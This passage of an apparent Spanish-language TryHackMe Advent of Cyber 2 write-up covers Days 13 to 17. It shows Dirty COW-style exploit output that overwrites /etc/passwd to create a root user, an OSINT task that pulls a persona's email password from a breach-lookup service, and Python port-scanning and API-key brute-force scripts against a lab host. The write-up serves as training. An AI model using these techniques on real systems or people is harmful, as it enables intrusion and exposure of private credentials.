ptrace <span class="m">0</span>
Done! Check /etc/passwd to see <span class="k">if</span> the new user was created.
You can log in with the username <span class="s1">&#39;firefart&#39;</span> and the password <span class="s1">&#39;test&#39;</span>.


DON<span class="s1">&#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
</span><span class="s1">Done! Check /etc/passwd to see if the new user was created.
</span><span class="s1">You can log in with the username &#39;</span>firefart<span class="s1">&#39; and the password &#39;</span>test<span class="s1">&#39;.
</span><span class="s1">
</span><span class="s1">
</span><span class="s1">DON&#39;</span>T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
$ su firefart
Password: 
firefart@christmas:/# <span class="nb">cd</span> /root
firefart@christmas:~# ls -lah
total 24K
drwx------  <span class="m">2</span> firefart root 4.0K Nov <span class="m">21</span> 20:38 .
drwxr-xr-x <span class="m">24</span> firefart root 4.0K Nov <span class="m">21</span> 20:38 ..
-rw-------  <span class="m">1</span> firefart root    <span class="m">0</span> Nov <span class="m">21</span> 20:38 .bash_history
-rw-r--r--  <span class="m">1</span> firefart root 3.1K Apr <span class="m">19</span>  <span class="m">2012</span> .bashrc
-rwxr-xr-x  <span class="m">1</span> firefart root 1.4K Nov <span class="m">21</span> 20:37 christmas.sh
-rw-r--r--  <span class="m">1</span> firefart root  <span class="m">611</span> Nov <span class="m">21</span> 20:37 message_from_the_grinch.txt
-rw-r--r--  <span class="m">1</span> firefart root  <span class="m">140</span> Apr <span class="m">19</span>  <span class="m">2012</span> .profile
firefart@christmas:~# cat mess*
Nice work, Santa!

Wow, this house sure was DIRTY!
I think they deserve coal <span class="k">for</span> Christmas, don<span class="s1">&#39;t you?
</span><span class="s1">So let&#39;</span>s leave some coal under the Christmas <span class="sb">`</span>tree<span class="sb">`</span>!

Let<span class="err">&#39;</span>s work together on this. Leave this text file here,
and leave the christmas.sh script here too...
but, create a file named <span class="sb">`</span>coal<span class="sb">`</span> in this directory!
Then, inside this directory, pipe the output
of the <span class="sb">`</span>tree<span class="sb">`</span> <span class="nb">command</span> into the <span class="sb">`</span>md5sum<span class="sb">`</span> command.

The output of that <span class="nb">command</span> <span class="o">(</span>the <span class="nb">hash</span> itself<span class="o">)</span> is
the flag you can submit to <span class="nb">complete</span> this task
<span class="k">for</span> the Advent of Cyber!

	- Yours,
		John Hammond
		er, sorry, I mean, the Grinch

	  - THE GRINCH, SERIOUSLY

firefart@christmas:~# touch coal
firefart@christmas:~# tree <span class="p">|</span> md5sum
8b16f0<span class="o">[</span>... SNIP ...<span class="o">]</span>f7f8427cc  -
firefart@christmas:~#
</code></pre></td></tr></table>
</div>
</div><h1 id="day-14---wheres-rudolph-">DAY 14 - Where&rsquo;s Rudolph?</h1>
<p>Se presenta un reto en el cual involucra un nombre de usuario: <code>IGuidetheClaus2020</code>. con el cual debemos de recabar informacion utilizando fuentes de datos abiertas (OSINT). Para las tareas del 1-5 debemos de indagar en el subreddit de este usuario, para la 6-11 en su cuenta de Twitter.</p>
<ul>
<li>
<p>1: <a href="https://www.reddit.com/user/IGuidetheClaus2020/comments/">https://www.reddit.com/user/IGuidetheClaus2020/comments/</a></p>
</li>
<li>
<p>2: <a href="https://www.reddit.com/r/books/comments/jsvby8/chicago_public_library_says_eliminating_fines_has/gdjz4ef/?context=3">https://www.reddit.com/r/books/comments/jsvby8/chicago_public_library_says_eliminating_fines_has/gdjz4ef/?context=3</a></p>
</li>
<li>
<p>3: Como se menciona en esta tarea, utilizamos Google para buscar el apellido del <strong>Creador</strong> de Rudolph.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_143054.png" alt="image" /></p>
</li>
<li>
<p>4: En los resultados de busqueda de Google aparece el usuario en: <a href="https://twitter.com/IGuideClaus2020/"><strong>Twitter</strong></a></p>
</li>
<li>
<p>5: Su cuenta de usuario: @<a href="https://twitter.com/IGuideClaus2020/"><strong>IGuideClaus2020</strong></a></p>
</li>
<li>
<p>6: De acuerdo con su cuenta de twitter, a este usuario parece interesarle el programa de TV <code>Bachelorette</code> el cual tiene más retwitts y &ldquo;favs&rdquo;.</p>
</li>
<li>
<p>7: En uno de sus <a href="https://twitter.com/IGuideClaus2020/status/1331612872988905473"><strong>twitts</strong></a> se presentan dos imagenes las cuales utilizamos para obtener la ubicacion del <strong>estado</strong> donde fueron tomadas, con Google Images: <a href="https://www.thompsoncoburn.com/news-events/news/2019-12-09/thompson-coburn-floats-down-michigan-avenue-in-first-magnificent-mile-lights-festival-appearance"><strong>Chicago</strong></a></p>
</li>
<li>
<p>8: En uno de sus <a href="https://twitter.com/IGuideClaus2020/status/1331615839318138883">twitts</a> escribe la URL de la <a href="https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg">imagen</a> en &ldquo;alta resolucion&rdquo; del lugar donde desfiló. Utilizando <a href="http://exif.regex.info/exif.cgi"><code>Jeffrey's Image Metadata Viewer</code></a> logramos obtener la ubicacion de GPS (EXIF: Latitude y Longitude).</p>
</li>
<li>
<p>9: Con la pagina en la tarea anterior tambien encontramos la flag.</p>
</li>
<li>
<p>10: En la cuenta de twitter especificamente en su biografia, aparece un correo electronico. Con la ayuda de <a href="https://scylla.sh"><strong>scylla.sh</strong></a> logramos obtener la contraseña de su correo electronico.</p>
</li>
<li>
<p>11: Utilizando la ubicacion (longitud/latitud) que encontramos en la Tarea 8, buscamos el numero de calle del hotel más cercano donde se hospedó.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_142314.png" alt="image" /></p>
</li>
</ul>
<p>Del porqué esa direccion, es porque tambien mencionó en uno de sus twitts que la foto era cerca de su hotel y tiempo despues mencionó el hotel Marriot.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_142351.png" alt="image" /></p>
<h1 id="day-15---scripting-">DAY 15 - Scripting</h1>
<p>Se presenta una serie de tareas relacionadas al lenguaje de programacion Python las cuales es posible resolver con la descripcion del reto del dia y utilizando una consola de Python.</p>
<details>
  <summary>Spoiler warning</summary>  
<pre><code>    What's the output of True + True?
    2

    What's the database for installing other peoples libraries called?
    Pypi

    What is the output of bool(&quot;False&quot;)?
    True

    What library lets us download the HTML of a webpage?
    requests

    What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today's material?
    [1, 2, 3, 6]

    What causes the previous task to output that?
    pass by reference
</code></pre>
</details>
<h1 id="day-16---scripting-">DAY 16 - Scripting</h1>
<p>Continuando con scripting, se presenta una maquina a la cual hay que encontrar:</p>
<ul>
<li>Puerto donde esta corriendo la pagina web.</li>
<li>Un directorio/pagina oculta.</li>
<li>Numero impar correcto de la API key.</li>
</ul>
<p>Utilizando el modulo <code>python-nmap</code> de <a href="https://pypi.org/project/python-nmap/"><strong>PyPI</strong></a> creamos un pequeño script para escaneo de puertos, con el cual encontramos el puerto <strong>8000</strong> abierto.</p>

<div id="23966aedf8b9abe1" class="codetab">
  <div class="codetab__links">
    
      <button class="codetab__link" aria-label="Tab link">java</button>
    
      <button class="codetab__link" aria-label="Tab link">javascript</button>
    
  </div>
  

  
<div id="cd138f946a2c779b" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python:script1.py" data-lang="python:script1.py"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">nmap</span>

<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;10.10.133.55&#39;</span>

<span class="n">nm</span> <span class="o">=</span> <span class="n">nmap</span><span class="o">.</span><span class="n">PortScanner</span><span class="p">()</span>
<span class="n">nm</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="s1">&#39;-p- --min-rate 1000 -sV&#39;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">host</span> <span class="ow">in</span> <span class="n">nm</span><span class="o">.</span><span class="n">all_hosts</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span> <span class="s1">&#39;Host:{} {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">hostname</span><span class="p">())</span> <span class="p">)</span>
    <span class="k">print</span><span class="p">(</span> <span class="s1">&#39;Estado: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">state</span><span class="p">())</span> <span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">all_protocols</span><span class="p">():</span>
      <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Protocolo: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
      <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
        <span class="n">ports</span> <span class="o">=</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
        <span class="n">ports</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
          <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Puerto: {} </span><span class="se">\t</span><span class="s1"> Estado: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">port</span><span class="p">][</span><span class="s2">&#34;state&#34;</span><span class="p">]))</span>
</code></pre></td></tr></table>
</div>
</div>
</div>

  
<div id="cda2acdeb395abc9" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script2.py 
----------------------------------------------------
Host:10.10.133.55 10.10.133.55
Estado: up
----------------------------------------------------
Protocolo: tcp
----------------------------------------------------
Puerto: <span class="m">8000</span>   Estado: open
kali@kali:~/thm/adventcyber2$ 
</code></pre></td></tr></table>
</div>
</div>
</div>


</div>

<script>
  'use strict';

  var containerId = JSON.parse("\"23966aedf8b9abe1\"");
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll('.codetab__link');
    codetabContents = containerElem.querySelectorAll('.codetab__content');
  }

  for (var i = 0; i < codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute('id'));
    codetabContents[i].style.display = 'none';

    if (0 === parseInt(i, 10) && !codetabContents[i].classList.contains('active')) {
      codetabContents[i].classList.add('active');
    }
  }

  for (var i = 0; i < codetabLinks.length; i++) {
    codetabLinks[i].setAttribute('id', ids[i]);

    if (0 === parseInt(i, 10) && !codetabLinks[i].classList.contains('active')) {
      codetabLinks[i].classList.add('active');
    } else {
      codetabLinks[i].classList.remove('active');
    }
  }

  if (codetabContents.length > 0) {
    codetabContents[0].style.display = 'block';
  }
</script>
<p>Nuevamente utilizando Python y con la lo aprendido el Dia 15 extrajimos todos las direcciones o links dentro de la pagina.</p>

<div id="9c8238c0cd5c5932" class="codetab">
  <div class="codetab__links">
    
      <button class="codetab__link" aria-label="Tab link">python</button>
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
  </div>
  
  
<div id="2e8acc816829a395" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python:script2.py" data-lang="python:script2.py"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.133.55:8000/static/index.html&#34;</span>
<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
<span class="n">links</span> <span class="o">=</span>  <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div>
</div>

  
<div id="8ddc1242d6c980f3" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script3.py 
../
None

https://github.com/BulmaTemplates/bulma-templates/blob/master/templates/hero.html
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
https://tryhackme.com
#
#
#
#
#
#
#
#
#
http://machine_ip/api/api_key
#
#
#
#
#
#
#
#
#
https://github.com/BulmaTemplates/bulma-templates
https://github.com/BulmaTemplates/bulma-templates
</code></pre></td></tr></table>
</div>
</div>
</div>


</div>

<script>
  'use strict';

  var containerId = JSON.parse("\"9c8238c0cd5c5932\"");
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll('.codetab__link');
    codetabContents = containerElem.querySelectorAll('.codetab__content');
  }

  for (var i = 0; i < codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute('id'));
    codetabContents[i].style.display = 'none';

    if (0 === parseInt(i, 10) && !codetabContents[i].classList.contains('active')) {
      codetabContents[i].classList.add('active');
    }
  }

  for (var i = 0; i < codetabLinks.length; i++) {
    codetabLinks[i].setAttribute('id', ids[i]);

    if (0 === parseInt(i, 10) && !codetabLinks[i].classList.contains('active')) {
      codetabLinks[i].classList.add('active');
    } else {
      codetabLinks[i].classList.remove('active');
    }
  }

  if (codetabContents.length > 0) {
    codetabContents[0].style.display = 'block';
  }
</script>
<p>Para poder encontrar el valor correcto de la <code>api_key</code> utilizamos un pequeño script el cual realizaba solicitude hacia la API.</p>

<div id="cae6973682a7b4f2" class="codetab">
  <div class="codetab__links">
    
      <button class="codetab__link" aria-label="Tab link">python</button>
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
  </div>
  

  
<div id="5b31ffeba21457ed" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python:script3.py" data-lang="python:script3.py"><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.133.55:8000/api/&#34;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
  <span class="n">n</span> <span class="o">=</span> <span class="n">i</span> <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">0</span>

  <span class="k">if</span> <span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div>
</div>

  
<div id="7e19651ce3bf9838" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script4.py 
<span class="m">1</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:1,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">3</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:3,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">5</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:5,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">7</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:7,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">9</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:9,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">11</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:11,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">13</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:13,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">15</span>
<span class="o">[</span>... snip ...<span class="o">]</span>
<span class="m">55</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:55,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">57</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:57,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;Winter Wonderland, Hyde Park, London.&#34;</span><span class="o">}</span>
<span class="m">59</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:59,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">61</span>
<span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:61,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
<span class="m">63</span>
^C
</code></pre></td></tr></table>
</div>
</div>
</div>


</div>

<script>
  'use strict';

  var containerId = JSON.parse("\"cae6973682a7b4f2\"");
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll('.codetab__link');
    codetabContents = containerElem.querySelectorAll('.codetab__content');
  }

  for (var i = 0; i < codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute('id'));
    codetabContents[i].style.display = 'none';

    if (0 === parseInt(i, 10) && !codetabContents[i].classList.contains('active')) {
      codetabContents[i].classList.add('active');
    }
  }

  for (var i = 0; i < codetabLinks.length; i++) {
    codetabLinks[i].setAttribute('id', ids[i]);

    if (0 === parseInt(i, 10) && !codetabLinks[i].classList.contains('active')) {
      codetabLinks[i].classList.add('active');
    } else {
      codetabLinks[i].classList.remove('active');
    }
  }

  if (codetabContents.length > 0) {
    codetabContents[0].style.display = 'block';
  }
</script>
<h1 id="day-17---reverse-engineering-">DAY 17 - Reverse Engineering</h1>
<p>Las instrucciones para el reto del dia incluyen utilizar la herramienta <code>radare2</code> el cual es un framework para realizar ingenieria inversa y analisis de binarios. La descripcion del reto es suficiente para obtener las respuestas.</p>
<ul>
<li>Valor de <code>local_ch</code> cuando la instruccion <code>movl</code> es &ldquo;ejecutada&rdquo;.</li>
<li>El valor de <code>eax</code> cuando la instruccion <code>ìmull</code> es &ldquo;ejecutada&rdquo;.</li>
<li>El valor de <code>local_4h</code> despues de que <code>eax</code> tiene el valor <code>0</code>.</li>
</ul>
<p>Se inicia <code>radare2</code> con el archivo <code>challenge1</code>, se indica que se realizará un analisis con el &ldquo;comando&rdquo; <code>aa</code>. Con el &ldquo;comando&rdquo;  <code>afl</code> listamos todas las <strong>funciones</strong> presentes en el archivo y junto con <code>| grep main</code> &ldquo;filtramos&rdquo; los valores de la funcion principal <strong>main</strong>. Con el nombre de la funcion se realiza un desensamblado de la funcion con el &ldquo;comando&rdquo; <code>pdf @sym.main</code> o <code>pdf @main</code>, lo que mostrará el codigo en ensamblador para su analisis.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">elfmceager@tbfc-day-17:~$ r2 -d ./challenge1
Process with PID <span class="m">1506</span> started...
<span class="o">=</span> attach <span class="m">1506</span> <span class="m">1506</span>
bin.baddr 0x00400000
Using 0x400000
Warning: Cannot initialize dynamic strings
asm.bits <span class="m">64</span>
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; aa
<span class="o">[</span> WARNING : block size exceeding max block size at 0x006ba220
<span class="o">[</span>+<span class="o">]</span> Try changing it with e anal.bb.maxsize
 WARNING : block size exceeding max block size at 0x006bc860
<span class="o">[</span>+<span class="o">]</span> Try changing it with e anal.bb.maxsize
<span class="o">[</span>x<span class="o">]</span> Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; afl <span class="p">|</span>grep main
0x00400b4d    <span class="m">1</span> <span class="m">35</span>           sym.main
0x00400de0   <span class="m">10</span> <span class="m">1007</span> -&gt; <span class="m">219</span>  sym.__libc_start_main
0x00403840   <span class="m">39</span> <span class="m">661</span>  -&gt; <span class="m">629</span>  sym._nl_find_domain
0x00403ae0  <span class="m">308</span> <span class="m">5366</span> -&gt; <span class="m">5301</span> sym._nl_load_domain
0x00415ef0    <span class="m">1</span> <span class="m">43</span>           sym._IO_switch_to_main_get_area
0x0044ce10    <span class="m">1</span> <span class="m">8</span>            sym._dl_get_dl_main_map
0x00470430    <span class="m">1</span> <span class="m">49</span>           sym._IO_switch_to_main_wget_area
0x0048f9f0    <span class="m">7</span> <span class="m">73</span>   -&gt; <span class="m">69</span>   sym._nl_finddomain_subfreeres
0x0048fa40   <span class="m">16</span> <span class="m">247</span>  -&gt; <span class="m">237</span>  sym._nl_unload_domain
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt; pdf @sym.main
            <span class="p">;</span>-- main:
/ <span class="o">(</span>fcn<span class="o">)</span> sym.main <span class="m">35</span>
<span class="p">|</span>   sym.main <span class="o">()</span><span class="p">;</span>
<span class="p">|</span>           <span class="p">;</span> var int local_ch @ rbp-0xc
<span class="p">|</span>           <span class="p">;</span> var int local_8h @ rbp-0x8
<span class="p">|</span>           <span class="p">;</span> var int local_4h @ rbp-0x4
<span class="p">|</span>              <span class="p">;</span> DATA XREF from 0x00400a4d <span class="o">(</span>entry0<span class="o">)</span>
<span class="p">|</span>           0x00400b4d      <span class="m">55</span>             push rbp
<span class="p">|</span>           0x00400b4e      4889e5         mov rbp, rsp
<span class="p">|</span>           0x00400b51      c745f4010000.  mov dword <span class="o">[</span>local_ch<span class="o">]</span>, <span class="m">1</span>
<span class="p">|</span>           0x00400b58      c745f8060000.  mov dword <span class="o">[</span>local_8h<span class="o">]</span>, <span class="m">6</span>
<span class="p">|</span>           0x00400b5f      8b45f4         mov eax, dword <span class="o">[</span>local_ch<span class="o">]</span>
<span class="p">|</span>           0x00400b62      0faf45f8       imul eax, dword <span class="o">[</span>local_8h<span class="o">]</span>
<span class="p">|</span>           0x00400b66      8945fc         mov dword <span class="o">[</span>local_4h<span class="o">]</span>, eax
<span class="p">|</span>           0x00400b69      b800000000     mov eax, <span class="m">0</span>
<span class="p">|</span>           0x00400b6e      5d             pop rbp
<span class="se">\ </span>          0x00400b6f      c3             ret
<span class="o">[</span>0x00400a30<span class="o">]</span>&gt;
</code></pre></td></tr></table>
</div>
